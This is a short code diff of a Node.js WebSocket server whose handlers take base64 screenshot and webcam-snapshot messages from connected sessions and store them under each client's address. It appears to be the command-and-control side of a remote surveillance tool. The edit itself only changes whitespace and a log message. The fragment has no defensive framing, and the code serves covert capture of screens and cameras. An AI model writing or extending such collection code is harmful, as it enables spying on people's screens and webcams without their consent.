@@ -33,12 +33,10 @@ wss.on('connection', function connection(ws) {
 		} else if (message.startsWith("##SCREENSHOT##")) {
 			var base64Data = message.replace("##SCREENSHOT##", "").replace(/^data:image\/png;base64,/, "");
 			mkdirp('screenshots/' + sessions[currentSession].clientAddress + "/", function(err) { 
-
 				require("fs").writeFile("screenshots/" + sessions[currentSession].clientAddress + "/" + Date.now() + ".png", base64Data, 'base64', function (err) {});
-
 			});
 		}else if (message.startsWith("##WEBCAM_SNAP##")) {
-			console.log("photo received");
+			console.log("[".bold + "+".blue + "] Photo received !".bold);
 			var base64Data = message.replace("##WEBCAM_SNAP##", "").replace(/^data:image\/png;base64,/, "");
 			mkdirp('webcam_snaps/' + sessions[currentSession].clientAddress + "/", function(err) { 
 				require("fs").writeFile('webcam_snaps/' + sessions[currentSession].clientAddress + "/" + Date.now() + ".jpeg", base64Data, 'base64', function (err) {});
